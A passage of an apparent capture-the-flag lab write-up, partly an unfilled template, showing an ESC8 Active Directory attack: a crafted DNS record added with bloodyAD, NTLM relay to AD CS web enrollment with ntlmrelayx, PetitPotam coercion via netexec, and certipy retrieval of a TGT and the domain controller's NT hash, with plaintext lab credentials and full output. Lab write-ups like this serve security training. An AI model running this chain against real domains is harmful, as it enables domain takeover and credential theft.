Certificate Templates                   : [!] Could not find any certificate templates

```
---
## ESC8

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

The record to add is structured as `<host><empty CREDENTIAL_TARGET_INFOMATION structure>`, which in this case will be `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. I’ll set the DNS record with `bloodyAD`

```shell
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.80
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

start `ntlm relay` targeting the ADCS webserver, and it listens on SMB:

```
impacket-ntlmrelayx -smb2support --target 'http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController
```

```
netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)                                                                                  
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile

```

```
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.129.150.101, attacking target http://DC-JPQ225.cicada.vl
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.150.101 against http://DC-JPQ225.cicada.vl SUCCEED [1]
[*] (SMB): Received connection from 10.129.150.101, attacking target http://DC-JPQ225.cicada.vl
[*] http:///@dc-jpq225.cicada.vl [1] -> Generating CSR...
[*] http:///@dc-jpq225.cicada.vl [1] -> CSR generated!
[*] http:///@dc-jpq225.cicada.vl [1] -> Getting certificate...
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.150.101 against http://DC-JPQ225.cicada.vl SUCCEED [2]
[*] http:///@dc-jpq225.cicada.vl [2] -> Skipping user  since attack was already performed
[*] http:///@dc-jpq225.cicada.vl [1] -> GOT CERTIFICATE! ID 88
[*] http:///@dc-jpq225.cicada.vl [1] -> Writing PKCS#12 certificate to ./DC-JPQ225.cicada.vl.pfx
[*] http:///@dc-jpq225.cicada.vl [1] -> Certificate successfully written to file


```

```
certipy-ad auth -pfx DC-JPQ225.cicada.vl.pfx -dc-ip 10.129.150.101
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

---
## User Flag

### Lateral Movement (if applicable)

Steps to move from initial foothold to user access.

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)